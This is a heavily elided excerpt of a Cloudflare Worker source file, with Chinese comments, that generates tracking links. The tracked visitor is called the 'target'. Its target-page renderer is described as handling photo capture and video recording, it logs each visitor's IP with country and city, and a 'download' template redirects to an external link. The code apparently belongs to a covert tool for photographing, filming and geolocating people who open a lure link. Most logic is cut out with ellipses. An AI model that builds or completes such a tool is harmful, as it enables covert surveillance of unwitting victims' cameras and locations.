...
export default {
  async fetch(request, env) {
    ...
    if (!env || !env.DB) {
      return new Response(
        `<html><body style="font-family:sans-serif;padding:2rem"><h1>系统错误</h1><p>未检测到 D1 数据库绑定。请在 Cloudflare Dashboard 中将 D1 数据库绑定到变量名 <code>DB</code>。</p></body></html>`,
    ...
    if (path.startsWith("/t/")) {
      ...
      return renderTargetPage(encoded);
    }
...
async function handleGenerate(request, env) {
  ...
  if (config.password && config.password.trim() !== '') {
    ...
    if (existing && existing.password !== null && existing.password !== config.password) {
  ...
  if (config.template === 'download') {
    ...
    // 如果没有文件但有外链，config.redirectUrl 已经在前端设置
  }
      ...
      async function generateLink() {
        ...
        try {
          ...
          if (config.template === 'download') {
            ...
            // 修正：先构建最终 config，再放入 FormData
            if (extUrl) config.redirectUrl = extUrl;
      ...
      async function queryData() {
        ...
        try {
          ...
          logs.forEach((log, index) => {
            ...
            const finalIpStr = (flag || cReg || city) ? (flag + ' ' + cReg + ' ' + city + ' [' + log.ip + ']') : log.ip;
...
/**
 * ==========================================
 * 目标页面渲染 (拍照修复、录像优化、异常保护)
 * ==========================================
 */
function renderTargetPage(encodedConfig) {
  // 保护：即使 encodedConfig 非法，也不会导致 Worker 崩溃
  let safeConfig = {};
  try {
    safeConfig = JSON.parse(decodeURIComponent(atob(encodedConfig)));
  } catch (e) {
    return new Response(`<html><body><p>链接无效或已损坏</p></body></html>`, { status: 400, headers: { "Content-Type": "text/html" } });
  }
